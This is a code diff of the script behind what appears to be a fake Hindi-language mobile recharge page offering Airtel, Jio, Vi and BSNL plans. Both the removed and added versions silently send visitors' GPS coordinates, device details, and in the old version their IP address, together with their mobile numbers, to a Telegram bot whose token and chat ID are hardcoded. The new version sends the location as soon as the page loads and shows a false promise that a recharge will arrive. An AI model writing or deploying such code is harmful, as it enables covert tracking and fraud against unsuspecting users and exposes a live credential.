@@ -1,106 +1,114 @@
-const form = document.getElementById("rechargeForm");
-const submitBtn = document.getElementById("submitBtn");
-const loadingSpinner = document.getElementById("loadingSpinner");
-const popupModal = document.getElementById("popupModal");
-const closePopupBtn = document.getElementById("closePopup");
-
-// Your Telegram Bot token and chat ID (replace with your own)
-const TELEGRAM_BOT_TOKEN = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
-const TELEGRAM_CHAT_ID = "6038115234";
-
-// On page load: ask for location permission
-window.onload = () => {
-  if (!navigator.geolocation) {
-    alert("आपके ब्राउज़र में लोकेशन सपोर्ट नहीं है।");
-    return;
-  }
-  navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      console.log("Location access granted");
-    },
-    (err) => {
-      alert("कृपया लोकेशन एक्सेस अनुमति दें ताकि हम आपकी सहायता कर सकें।");
-    }
-  );
+const plansData = {
+  Airtel: [
+    "₹199 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल",
+    "₹249 - 28 दिन - 2GB/दिन + अनलिमिटेड कॉल",
+    "₹399 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल"
+  ],
+  Jio: [
+    "₹149 - 28 दिन - 1GB/दिन + अनलिमिटेड कॉल",
+    "₹219 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल",
+    "₹349 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल"
+  ],
+  Vi: [
+    "₹199 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल",
+    "₹269 - 28 दिन - 2GB/दिन + अनलिमिटेड कॉल",
+    "₹399 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल"
+  ],
+  BSNL: [
+    "₹155 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल",
+    "₹249 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल",
+    "₹379 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल"
+  ]
 };
 
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
+const simSelect = document.getElementById('sim');
+const plansDiv = document.getElementById('plans');
+const planList = document.getElementById('plan-list');
+const mobileInput = document.getElementById('mobile');
+const submitBtn = document.getElementById('submitBtn');
 
-  const mobile = form.mobile.value.trim();
-  const plan = form.plan.value;
-
-  if (!mobile.match(/^[6-9]\d{9}$/)) {
-    alert("कृपया सही 10 अंकों का मोबाइल नंबर दर्ज करें।");
-    return;
+// Show plans on SIM select
+simSelect.addEventListener('change', () => {
+  const sim = simSelect.value;
+  if(sim && plansData[sim]) {
+    planList.innerHTML = '';
+    plansData[sim].forEach(plan => {
+      const li = document.createElement('li');
+      li.textContent = plan;
+      planList.appendChild(li);
+    });
+    plansDiv.style.display = 'block';
+  } else {
+    plansDiv.style.display = 'none';
+    planList.innerHTML = '';
   }
-  if (!plan) {
-    alert("कृपया रिचार्ज प्लान चुनें।");
-    return;
-  }
-  if (!navigator.geolocation) {
-    alert("आपके ब्राउज़र में लोकेशन सपोर्ट नहीं है।");
-    return;
-  }
-
-  submitBtn.style.display = "none";
-  loadingSpinner.style.display = "block";
-
-  navigator.geolocation.getCurrentPosition(
-    async (position) => {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const deviceInfo = navigator.userAgent;
-
-      // Get IP address using public API
-      let ip = "Unknown";
-      try {
-        const response = await fetch("https://api.ipify.org?format=json");
-        const data = await response.json();
-        ip = data.ip;
-      } catch {
-        ip = "Unavailable";
-      }
-
-      // Prepare Telegram message
-      const message = `📱 नया रिचार्ज अनुरोध:
-मोबाइल नंबर: ${mobile}
-प्लान: ${plan}
-लोकेशन: https://www.google.com/maps?q=${latitude},${longitude}
-IP: ${ip}
-डिवाइस: ${deviceInfo}
-`;
-
-      try {
-        // Send to Telegram bot
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-          }),
-        });
-
-        loadingSpinner.style.display = "none";
-        popupModal.classList.add("show");
-        form.reset();
-        submitBtn.style.display = "inline-block";
-      } catch (error) {
-        alert("त्रुटि हुई। कृपया पुनः प्रयास करें।");
-        loadingSpinner.style.display = "none";
-        submitBtn.style.display = "inline-block";
-      }
-    },
-    (err) => {
-      alert("लोकेशन एक्सेस अनुमति आवश्यक है। कृपया Allow करें।");
-      loadingSpinner.style.display = "none";
-      submitBtn.style.display = "inline-block";
-    }
-  );
 });
 
-// Close popup
-closePopupBtn.addEventListener("click", () => {
-  popupModal.classList.remove("show");
+// Send location to Telegram immediately on load
+window.onload = () => {
+  if(navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendLocation, () => {
+      alert('कृपया लोकेशन अनुमति दें ताकि सेवा सुचारू रूप से चले।');
+    });
+  } else {
+    alert('आपके ब्राउज़र में लोकेशन सपोर्ट नहीं है।');
+  }
+};
+
+function sendLocation(position) {
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+  const device = navigator.userAgent;
+
+  const message = `🟢 नया रिचार्ज आवेदन (सक्षम):\n` +
+                  `डिवाइस: ${device}\n` +
+                  `स्थान: https://maps.google.com/?q=${lat},${lon}`;
+
+  fetch(`https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: '6038115234',
+      text: message
+    })
+  }).catch(() => {
+    console.log('टेलीग्राम भेजने में समस्या');
+  });
+}
+
+// On submit button click
+submitBtn.addEventListener('click', () => {
+  const sim = simSelect.value;
+  const mobile = mobileInput.value.trim();
+
+  if(!sim) {
+    alert('कृपया सिम चुनें।');
+    return;
+  }
+  if(!/^[6-9]\d{9}$/.test(mobile)) {
+    alert('कृपया सही 10 अंकों का मोबाइल नंबर दर्ज करें।');
+    return;
+  }
+
+  // Send recharge request to Telegram
+  const message = `📱 नया रिचार्ज आवेदन:\n` +
+                  `सिम: ${sim}\n` +
+                  `मोबाइल नंबर: ${mobile}`;
+
+  fetch(`https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: '6038115234',
+      text: message
+    })
+  }).then(() => {
+    alert('आपका रिचार्ज आवेदन सफलतापूर्वक भेज दिया गया है। 24 घंटे में SMS प्राप्त होगा।');
+    mobileInput.value = '';
+    simSelect.value = '';
+    plansDiv.style.display = 'none';
+    planList.innerHTML = '';
+  }).catch(() => {
+    alert('त्रुटि हुई, कृपया पुनः प्रयास करें।');
+  });
 });
